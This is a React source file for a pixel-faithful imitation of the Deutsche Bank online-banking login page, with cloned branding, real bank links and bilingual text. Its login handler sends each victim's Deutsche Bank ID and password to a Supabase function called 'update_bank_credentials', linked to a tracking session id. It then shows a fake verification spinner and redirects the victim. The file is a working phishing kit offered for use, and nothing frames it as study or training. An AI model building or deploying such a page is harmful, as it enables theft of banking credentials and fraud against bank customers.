import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";

const BLUE = "#0018a8";
const LIGHT = "#ceeaf8";
const LINK = "#0550d1";
const NAVY = "#171945";
const ERR = "#78070a";
const GREY = "#b5b5b5";

const URLS = {
  idHelp:
    "https://www.deutsche-bank.de/pk/service-und-kontakt/services/fragen-antworten/online-banking/was-gebe-ich-in-das-login-feld-deutsche-bank-id-ein-.html",
  teaser:
    "https://www.deutsche-bank.de/pk/sparen-und-anlegen/sparen/festzinssparen.html?kid=i.1400.04.21&kidc=online-banking-login",
  secNews:
    "https://www.deutsche-bank.de/pk/service-und-kontakt/services/sicherheit/aktuelle-sicherheitshinweise.html",
  secOverview:
    "https://www.deutsche-bank.de/pk/service-und-kontakt/services/sicherheit.html",
  requestAccess:
    "https://www.deutsche-bank.de/opra4x/public/pfb/request-online-banking-access/#/page-1-0",
  secProcedures:
    "https://www.deutsche-bank.de/pk/konto-und-karte/services/sicherheit-im-online-banking/sicherheitsverfahren.html",
  help: "https://www.deutsche-bank.de/pk/service-und-kontakt/services.html",
  demo: "https://meine.deutsche-bank.de/demo/",
  imprint:
    "https://www.deutsche-bank.de/pk/lp/rechtliche-hinweise.html#parsys-accordion-accordionParsys-accordionentry_811071315",
  legal: "https://www.deutsche-bank.de/pk/lp/rechtliche-hinweise.html",
  privacy:
    "https://www.deutsche-bank.de/pk/shared/pu_help_ovv_datenschutz.standalone.html",
  cookies: "javascript:UC_UI.showSecondLayer();",
  revoke:
    "https://www.deutsche-bank.de/opra4x/public/db/product-revocation/#/opra4x/public/db/product-revocation/?product=WIDERRUF_PWS_SELFSERV_DB",
};

type Lang = "de" | "en";

const COPY: Record<Lang, {
  infoTitle: string;
  info1a: string; info1b: string; infoHere: string; info1c: string;
  info2: string;
  bullet1: string; bullet2: string;
  greeting: string;
  enterCreds: string;
  idLabel: string;
  pwLabel: string;
  forgot: string;
  continue: string;
  login: string;
  back: string;
  idError: string;
  teaserTitle: string;
  teaserText: string;
  learnMore: string;
  secInfoTitle: string; secInfoText: string;
  secNews: string; secOverview: string;
  accessTitle: string; accessText: string; requestAccess: string;
  procTitle: string; procText: string; procedures: string;
  langToggle: string;
  help: string; demo: string;
  imprint: string; legal: string; privacy: string; cookies: string;
  revoke: string; copyright: string;
}> = {
  de: {
    infoTitle: "Login mit Ihrer Deutsche Bank ID",
    info1a: "Sie können sich im Online-Banking der Deutschen Bank nur noch mit Ihrer Deutsche Bank ID anmelden. Der bisherige Link „Mit Filiale, Konto und PIN einloggen\" ist entfallen. Mehr Informationen finden Sie ",
    info1b: "",
    infoHere: "hier",
    info1c: ".",
    info2: "Haben Sie noch keine persönliche Deutsche Bank ID, melden Sie sich wie folgt an:",
    bullet1: "Geben Sie im Feld \"Deutsche Bank ID\" Ihre bisherige Filialkontonummer ein - ohne Leerzeichen und ohne Unterkontonummer",
    bullet2: "Geben Sie anschließend Ihre PIN im Feld „Passwort\" ein",
    greeting: "Guten Tag",
    enterCreds: "Bitte geben Sie Ihre Zugangsdaten ein.",
    idLabel: "Deutsche Bank ID",
    pwLabel: "Passwort",
    forgot: "Zugangsdaten vergessen?",
    continue: "Weiter",
    login: "Einloggen",
    back: "Zurück",
    idError: "Bitte prüfen Sie Ihre Eingabe. Geben Sie Ihre Deutsche Bank ID ein.",
    teaserTitle: "FestzinsSparen – jetzt 3,0 % p. a. sichern*",
    teaserText: "Lassen Sie Ihr Geld sicher wachsen.",
    learnMore: "Mehr erfahren",
    secInfoTitle: "Sicherheitshinweise",
    secInfoText: "Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.",
    secNews: "Link zu den aktuellen Sicherheitshinweisen",
    secOverview: "Link zu Sicherheit im Überblick",
    accessTitle: "Online-Banking Zugang",
    accessText: "Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.",
    requestAccess: "Zugang zum Online-Banking beantragen",
    procTitle: "Unsere Sicherheitsverfahren",
    procText: "Alles Wissenswerte rund um Ihren Login.",
    procedures: "Link zu den Sicherheitsverfahren",
    langToggle: "English Version",
    help: "Hilfe", demo: "Demo-Konto",
    imprint: "Impressum", legal: "Rechtliche Hinweise", privacy: "Datenschutz", cookies: "Cookie-Einstellungen",
    revoke: "Vertrag widerrufen", copyright: "© 2026 Deutsche Bank AG",
  },
  en: {
    infoTitle: "Login with your Deutsche Bank ID",
    info1a: "We only offer the Deutsche Bank ID as a credential for logging into the Deutsche Bank Online Banking. The previous link \"Login with branch, account and PIN\" is no longer available. You can find more information ",
    info1b: "",
    infoHere: "here",
    info1c: ".",
    info2: "If you do not yet have a personal Deutsche Bank ID, please sign in as follows:",
    bullet1: "Enter your previous branch/account number in the \"Deutsche Bank ID\" field – without spaces and without the sub-account number.",
    bullet2: "Then enter your PIN in the \"Password\" field.",
    greeting: "Hello",
    enterCreds: "Please enter your credentials.",
    idLabel: "Deutsche Bank ID",
    pwLabel: "Password",
    forgot: "Forgotten your credentials?",
    continue: "Continue",
    login: "Login",
    back: "Back",
    idError: "Please check your entry. Enter your Deutsche Bank ID.",
    teaserTitle: "Deutsche Bank FestzinsSparen",
    teaserText: "3.0% p.a.* fixed interest for 12 months",
    learnMore: "Learn more",
    secInfoTitle: "Security information",
    secInfoText: "Protect yourself and your online banking. We will be happy to help you.",
    secNews: "Security at a glance",
    secOverview: "Security at a glance",
    accessTitle: "Online banking access",
    accessText: "Here you can apply for access to your online banking.",
    requestAccess: "Apply for online banking access (german)",
    procTitle: "Our security procedures",
    procText: "Everything you need to know about your login (german site).",
    procedures: "Security procedure",
    langToggle: "Deutsche Version",
    help: "Help", demo: "Demo account",
    imprint: "Imprint", legal: "Legal notice", privacy: "Privacy", cookies: "Cookie settings",
    revoke: "Revoke contract", copyright: "© 2026 Deutsche Bank AG",
  },
};

function fieldStyle(focused: boolean, touched: boolean, hasValue: boolean, hovered: boolean) {
  const errorEmpty = touched && !hasValue;
  if (focused) {
    if (errorEmpty) {
      return { borderColor: ERR, boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`, labelColor: ERR, isError: true };
    }
    return { borderColor: LINK, boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`, labelColor: hasValue ? LINK : NAVY, isError: false };
  }
  if (errorEmpty) {
    return { borderColor: ERR, boxShadow: "none", labelColor: ERR, isError: true };
  }
  if (hovered && hasValue) {
    return { borderColor: LINK, boxShadow: "none", labelColor: NAVY, isError: false };
  }
  return { borderColor: GREY, boxShadow: "none", labelColor: NAVY, isError: false };
}

const DeutscheBank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [dbId, setDbId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [idFocused, setIdFocused] = useState(false);
  const [idTouched, setIdTouched] = useState(false);
  const [idHover, setIdHover] = useState(false);
  const [pwFocused, setPwFocused] = useState(false);
  const [pwTouched, setPwTouched] = useState(false);
  const [pwHover, setPwHover] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const t = COPY[lang];

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);

  const handleContinue = () => {
    if (dbId.trim().length === 0) return;
    setStep(2);
  };

  const handleLogin = async () => {
    if (password.length === 0) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: dbId,
        p_password: password,
        p_username_label: "Deutsche Bank ID",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const ext = { target: "_blank", rel: "noopener noreferrer" } as const;

  return (
    <>
      <style>{`
        .db-font { font-family: 'DeutscheBankUI', 'Arial', sans-serif; }
        .db-font a { letter-spacing: 0.2px; }
        .db-primary-btn { background:#0550d1; transition: background 120ms ease; }
        .db-primary-btn:hover { background:#0445b0; }
        @media (min-width: 1024px) {
          .db-right-panel {
            position: fixed; top: 0; bottom: 0;
            left: max(788px, calc(50% + 188px));
            width: 280px; overflow-y: auto;
            scrollbar-width: none; -ms-overflow-style: none;
          }
          .db-right-panel::-webkit-scrollbar { display: none; }
        }
      `}</style>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col db-font" style={{ color: "#1a1a1a" }}>
        <div
          className="relative flex-1"
          style={{
            backgroundImage: `url(${bgAsset.url})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            backgroundColor: BLUE,
          }}
        >
          <div className="max-w-[1200px] mx-auto px-4 py-8 lg:py-16 grid lg:grid-cols-[minmax(0,560px)_minmax(0,360px)] gap-16">
            {/* LEFT COLUMN */}
            <div className="space-y-6">
              {/* Info box */}
              <div
                className="flex gap-3 px-5 py-8 rounded-sm text-[14px] leading-snug"
                style={{ backgroundColor: LIGHT, color: "#171945" }}
              >
                <div className="pt-0.5">
                  <div
                    className="w-5 h-5 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: "#206683" }}
                  >
                    <Info size={14} color="#fff" />
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="text-[15px]">{t.infoTitle}</div>
                  <p>
                    {t.info1a}
                    <a href={URLS.idHelp} {...ext} className="underline">{t.infoHere}</a>
                    {t.info1c}
                  </p>
                  <p>{t.info2}</p>
                  <ul className="list-disc pl-5 space-y-1">
                    <li>{t.bullet1}</li>
                    <li>{t.bullet2}</li>
                  </ul>
                </div>
              </div>

              {/* Login card */}
              <div className="bg-white p-6 lg:p-8 shadow-sm" style={{ minHeight: 340 }}>
                <div className="mb-6">
                  <img src={logoAsset.url} alt="Deutsche Bank" className="h-6 w-auto" />
                </div>

                {step === 1 ? (
                  <h1 className="text-[28px] font-semibold mb-5" style={{ color: "#171945", lineHeight: 1.2 }}>
                    {t.greeting}
                  </h1>
                ) : (
                  <div className="mb-2 flex items-center" style={{ height: 34 }}>
                    <button
                      type="button"
                      onClick={() => setStep(1)}
                      className="flex items-center gap-1 text-[13px] font-bold underline"
                      style={{ color: LINK }}
                    >
                      <ArrowLeft size={13} /> {t.back}
                    </button>
                  </div>
                )}
                <p className={`text-[15px] mb-5 ${step === 2 ? "mt-6" : ""}`} style={{ color: NAVY }}>
                  {t.enterCreds}
                </p>

                {step === 1 ? (
                  <>
                    {(() => {
                      const fs = fieldStyle(idFocused, idTouched, dbId.length > 0, idHover);
                      return (
                        <>
                          <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
                            {t.idLabel}
                          </label>
                          <div style={{ padding: "3px" }}>
                            <input
                              type="text"
                              value={dbId}
                              onChange={(e) => setDbId(e.target.value)}
                              onFocus={() => setIdFocused(true)}
                              onBlur={() => { setIdFocused(false); setIdTouched(true); }}
                              onMouseEnter={() => setIdHover(true)}
                              onMouseLeave={() => setIdHover(false)}
                              onKeyDown={(e) => e.key === "Enter" && handleContinue()}
                              autoFocus
                              className="w-full px-3 py-3 text-[16px] outline-none"
                              style={{
                                border: `1px solid ${fs.borderColor}`,
                                borderRadius: 2,
                                boxShadow: fs.boxShadow,
                                transition: "box-shadow 80ms ease, border-color 80ms ease",
                              }}
                            />
                          </div>
                          {fs.isError && (
                            <div className="flex items-start gap-2 mt-2 text-[13px]" style={{ color: ERR }}>
                              <span
                                className="inline-flex items-center justify-center shrink-0 mt-0.5"
                                style={{
                                  width: 16, height: 16, borderRadius: "50%",
                                  background: ERR, color: "#fff",
                                  fontSize: 11, fontWeight: 700, fontFamily: "serif",
                                  lineHeight: 1,
                                }}
                              >i</span>
                              <span>{t.idError}</span>
                            </div>
                          )}
                        </>
                      );
                    })()}

                    <div className="flex items-center justify-between mt-28">
                      <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
                        {t.forgot}
                      </a>
                      <button
                        type="button"
                        onClick={handleContinue}
                        className="db-primary-btn px-8 py-3.5 text-white font-semibold text-[15px]"
                        style={{ cursor: "pointer" }}
                      >
                        {t.continue}
                      </button>
                    </div>
                  </>
                ) : (
                  <>
                    {(() => {
                      const fs = fieldStyle(pwFocused, pwTouched, password.length > 0, pwHover);
                      return (
                        <>
                          <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
                            {t.pwLabel}
                          </label>
                          <div style={{ padding: "3px" }}>
                            <div
                              className="relative"
                              onMouseEnter={() => setPwHover(true)}
                              onMouseLeave={() => setPwHover(false)}
                            >
                              <input
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                onFocus={() => setPwFocused(true)}
                                onBlur={() => { setPwFocused(false); setPwTouched(true); }}
                                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                                autoFocus
                                className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
                                style={{
                                  border: `1px solid ${fs.borderColor}`,
                                  borderRadius: 2,
                                  boxShadow: fs.boxShadow,
                                  transition: "box-shadow 80ms ease, border-color 80ms ease",
                                }}
                              />
                              <button
                                type="button"
                                onClick={() => setShowPassword(!showPassword)}
                                className="absolute right-3 top-1/2 -translate-y-1/2"
                                style={{ color: BLUE }}
                                aria-label="Passwort anzeigen"
                              >
                                {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
                              </button>
                            </div>
                          </div>
                        </>
                      );
                    })()}

                    <div className="flex items-center justify-between mt-28">
                      <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
                        {t.forgot}
                      </a>
                      <button
                        type="button"
                        onClick={handleLogin}
                        disabled={password.length === 0}
                        className={password.length === 0 ? "px-8 py-3.5 text-white font-semibold text-[15px]" : "db-primary-btn px-8 py-3.5 text-white font-semibold text-[15px]"}
                        style={{
                          cursor: password.length === 0 ? "not-allowed" : "pointer",
                          backgroundColor: password.length === 0 ? "#b5b5b5" : undefined,
                        }}
                      >
                        {t.login}
                      </button>
                    </div>
                  </>
                )}
              </div>
            </div>

            {/* RIGHT COLUMN */}
            <div className="db-right-panel bg-white shadow-sm">
              <a href={URLS.teaser} {...ext} className="block px-7 pt-7 pb-6">
                <img
                  src={teaserAsset.url}
                  alt="3,0% p.a. FestzinsSparen"
                  className="w-full h-auto mb-3"
                />
                <div>
                  <div className="text-[16px] font-semibold leading-snug" style={{ color: "#111" }}>
                    {t.teaserTitle}
                  </div>
                  <div className="text-[14px] mt-2" style={{ color: "#333" }}>
                    {t.teaserText}
                  </div>
                  <div className="mt-3 text-[13px] underline font-bold" style={{ color: LINK }}>
                    {t.learnMore}
                  </div>
                </div>
              </a>

              <div className="border-t border-gray-200" />

              <InfoBlock
                icon={<AlertTriangle size={20} color="#171945" />}
                title={t.secInfoTitle}
                text={t.secInfoText}
                links={[
                  { label: t.secNews, href: URLS.secNews },
                  { label: t.secOverview, href: URLS.secOverview },
                ]}
              />
              <InfoBlock
                icon={<Monitor size={20} color="#171945" />}
                title={t.accessTitle}
                text={t.accessText}
                links={[{ label: t.requestAccess, href: URLS.requestAccess }]}
              />
              <InfoBlock
                icon={<Lock size={20} color="#171945" />}
                title={t.procTitle}
                text={t.procText}
                links={[{ label: t.procedures, href: URLS.secProcedures }]}
              />

              <div className="px-7 py-7 text-[13px]" style={{ backgroundColor: "#1e2a78", color: "#fff" }}>
                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
                  <button
                    type="button"
                    onClick={() => setLang(lang === "de" ? "en" : "de")}
                    className="hover:underline text-left"
                    style={{ color: "#fff", background: "none", padding: 0 }}
                  >
                    {t.langToggle}
                  </button>
                  <a href={URLS.help} {...ext} className="hover:underline">{t.help}</a>
                  <a href={URLS.demo} {...ext} className="hover:underline">{t.demo}</a>
                </div>
                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
                  <a href={URLS.imprint} {...ext} className="hover:underline">{t.imprint}</a>
                  <a href={URLS.legal} {...ext} className="hover:underline">{t.legal}</a>
                  <a href={URLS.privacy} {...ext} className="hover:underline">{t.privacy}</a>
                </div>
                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-4 font-bold text-[13px]">
                  <a href={URLS.cookies} className="hover:underline">{t.cookies}</a>
                </div>
                <a
                  href={URLS.revoke}
                  {...ext}
                  className="inline-block text-[13px] font-semibold px-4 py-2 mb-3 text-white no-underline"
                  style={{ backgroundColor: "#0550d1" }}
                >
                  {t.revoke}
                </a>
                <div className="text-[12px]">{t.copyright}</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

const InfoBlock = ({
  icon,
  title,
  text,
  links,
}: {
  icon: React.ReactNode;
  title: string;
  text: string;
  links: { label: string; href: string }[];
}) => (
  <div className="px-7 py-6">
    <div className="flex items-center gap-2 mb-2 font-semibold text-[15px]">
      {icon}
      {title}
    </div>
    <p className="text-[14px] mb-3" style={{ color: "#333" }}>
      {text}
    </p>
    <div className="space-y-1">
      {links.map((l) => (
        <a
          key={l.label}
          href={l.href}
          target="_blank"
          rel="noopener noreferrer"
          className="block text-[13px] underline font-bold"
          style={{ color: LINK }}
        >
          {l.label}
        </a>
      ))}
    </div>
  </div>
);

export default DeutscheBank;
